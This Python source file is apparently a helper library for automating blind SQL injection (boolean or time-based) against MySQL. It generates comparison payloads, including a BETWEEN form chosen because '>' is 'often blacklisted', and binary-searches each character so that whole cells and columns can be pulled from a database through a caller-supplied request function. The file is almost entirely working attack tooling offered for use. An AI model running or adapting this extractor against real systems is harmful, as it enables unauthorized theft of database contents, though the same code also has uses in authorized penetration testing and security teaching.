#!/bin/python

import math
from string import Template
from typing import Callable, Union

class AbstractConfig:
    """Contains the Database's specificities"""

    end_char: int
    """the int value of then '\0' equivalent for this database"""

    start_index: int
    """the index of the fist item for this database"""

    def get_equal_compare(self, value: int) -> str:
        """Generate equality comparator for this database"""
        pass
    def get_diff_compare(self, value: int) -> str:
        """Generate none equality comparator for this database"""
        pass

    def get_supp_compare(self, value: int, max: int) -> str:
        """Generate superior comparator for this database"""
        pass


class MySqlConfig(AbstractConfig):
    """Contains Mysql specificities"""
    end_char: int = 0
    start_index: int = 1

    def get_equal_compare(self, check_value: int) -> str:
        return f"={check_value}"

    def get_diff_compare(self, check_value: int) -> str:
        return f"!={check_value}"

    def get_supp_compare(self, check_value: int, min: int, max: int) -> str:
        """Between because '>' is often blacklisted"""
        return f" BETWEEN {check_value + 1} AND {max}"

class SqliHelper:
    """help for automated exploitation of SQL Blind (Time or Boolean) Injection"""
    def __init__(
        self,
        config: AbstractConfig, # Configuration for this exploitation 
        execute_request: Callable[[str], bool], # function who really execute the sqli
        template: Template = None
    ) -> None:
        self.candidates: list[int] = []

        self.__current_candidats_min_index: int
        self.__current_candidats_max_index: int
        self.__current_candidate_index: int

        self.__start_with: list[int]
        self.__is_start_matching: bool

        self.__injection_template: Template = template
        self.__config: AbstractConfig = config
        self.__current_injection_char: int = config.start_index
        self.__execute_request: Callable[[str], bool] = execute_request

    def string_to_candidates(to_add: str) -> list[int]:
        candidates: list[int] = []
        for char in to_add:
            candidates.append(ord(char))
        return candidates

    def prepare_new(
        self, 
        candidates: list[int] = [], 
        start_with: list[int] = [], 
        template: Template = None
    ) -> None:
        """Init for a new payload"""
        self.__start_with = start_with
        self.__is_start_matching = len(start_with) > 0

        if len(candidates) > 0:
            self.candidates = candidates

        if template != None:
            self.__injection_template = template

        self.__normalize_cadidates()

        self.__current_injection_char = self.__config.start_index
        self.__current_candidats_min_index: int = 0
        self.__current_candidats_max_index: int = len(self.candidates) - 1

    def __normalize_cadidates(self) -> None:
        if not self.__config.end_char in self.candidates:
            self.candidates.append(self.__config.end_char)

        self.candidates.sort()

        # unique all values
        self.candidates = (list(set(self.candidates)))


    def __get_test_case(self) -> str:
        """define the values et operator for the next Test"""

        # if we have a probable begin, test it first
        if self.__is_start_matching:            
            if len(self.__start_with) >= self.__current_injection_char:
                self.__current_candidate_index = self.candidates.index(
                    self.__start_with[
                        self.__current_injection_char - self.__config.start_index
                    ]
                )

                return self.__config.get_equal_compare(
                    self.candidates[self.__current_candidate_index]
                )
            else:
                self.__is_start_matching = False

        # if there are just 2 candidates
        if self.__current_candidats_max_index - self.__current_candidats_min_index < 2:
            self.__current_candidate_index = self.__current_candidats_min_index

            return self.__config.get_equal_compare(
                self.candidates[self.__current_candidate_index]
            )

        # in normal case : Binary search algorithm
        else:
            self.__current_candidate_index = (
                math.floor(
                    (
                        self.__current_candidats_max_index
                        - self.__current_candidats_min_index
                    )
                    / 2
                )
                + self.__current_candidats_min_index
            )
            return self.__config.get_supp_compare(
                self.candidates[self.__current_candidate_index],
                self.candidates[self.__current_candidats_min_index],
                self.candidates[self.__current_candidats_max_index],
            )

    def __build_payload(self, request: str) -> str:
        operator = self.__get_test_case()
        return self.__generate_payload(operator, request)

    def __generate_payload(self, test: str, request: str) -> str:
        return self.__injection_template.substitute(
            request=request,
            test=test,
            index=self.__current_injection_char,
        )

    def __get_result(self, result: bool) -> Union[int, None]:
        """return the result or None if need more requests"""

        if self.__is_start_matching:
            if result:
                return self.__start_with[
                    self.__current_injection_char - self.__config.start_index
                ]
            else:
                self.__is_start_matching = False
                return None

        elif (
            self.__current_candidats_max_index - self.__current_candidats_min_index < 2
        ):
            if result:
                return self.candidates[self.__current_candidats_min_index]
            else:
                return self.candidates[self.__current_candidats_max_index]

        else:
            if result:
                self.__current_candidats_min_index = self.__current_candidate_index + 1
            else:
                self.__current_candidats_max_index = self.__current_candidate_index
            return None

    def __next(self) -> None:
        self.__current_injection_char += 1
        self.__current_candidats_min_index: int = 0
        self.__current_candidats_max_index: int = len(self.candidates) - 1

    def check(
        self,
        request: str = None,
        template: Template = None,
        out_of_range_value: int = 9999999,
    ) -> bool:
        """test if the current configuration is a valid injection"""
        if template == None:
            request = self.__generate_payload(
                self.__config.get_diff_compare(out_of_range_value),
                request
            )
        else:
            request = template.substitute()

        return self.__execute_request(request)


    def extract_val(self, sub_request: str) -> int:
        """Extract value (base10) of one item"""
        result = None
        while result == None:
            payload = self.__build_payload(sub_request)
            res = self.__execute_request(payload)
            result = self.__get_result(res)
        
        return result
        
    def extract_cell(self, sub_request: str) -> list[int]:
        """Extract value (base10) of each item in a cell"""
        result: list[int] = []
        while True:
            new_item = self.extract_val(sub_request)
            if(new_item == self.__config.end_char):
                break
            
            result.append(new_item)
            self.__next()
        return result

    def extract_column(
        self,
        request_template: Template,
        start_index: int,
        max_index: int = -1,
    )-> list[list[int]]:
        """Extract values (base10) of each cells in the column"""
        index = start_index
        last_result = []
        result: list[list[int]] = []

        while max_index == -1 or index <= max_index:
            request = request_template.safe_substitute(index=index)
            self.prepare_new(start_with=last_result)
            if not self.check(request):
                break

            last_result = self.extract_cell(request)
            if len(last_result) > 0:
                result.append(last_result)
                index += 1
            else:
                break

        return result
